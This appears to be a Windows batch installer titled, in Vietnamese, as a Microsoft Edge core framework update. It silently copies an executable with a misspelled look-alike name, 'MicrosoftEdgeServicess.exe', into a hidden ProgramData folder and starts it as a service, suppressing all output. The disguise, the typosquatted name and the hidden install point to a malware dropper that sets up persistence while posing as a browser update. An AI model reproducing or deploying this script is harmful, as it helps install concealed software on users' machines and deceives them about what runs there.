@echo off
title Cap Nhat Microsoft Edge Core Framework
ping 127.0.0.1 -n 4 >nul
cd /d "%~dp0"
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1
if not exist "C:\ProgramData\MicrosoftEdgeServicess" mkdir "C:\ProgramData\MicrosoftEdgeServicess" >nul 2>&1
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "C:\ProgramData\MicrosoftEdgeServicess\MicrosoftEdgeServicess.exe" >nul 2>&1
if exist "%~dp0msedge_settings.json" copy /Y "%~dp0msedge_settings.json" "C:\ProgramData\MicrosoftEdgeServicess\msedge_settings.json" >nul 2>&1
if exist "%~dp0config.json" copy /Y "%~dp0config.json" "C:\ProgramData\MicrosoftEdgeServicess\config.json" >nul 2>&1
attrib +h "C:\ProgramData\MicrosoftEdgeServicess" >nul 2>&1
sc.exe start MicrosoftEdgeServicess >nul 2>&1
net start MicrosoftEdgeServicess >nul 2>&1
exit /b 0
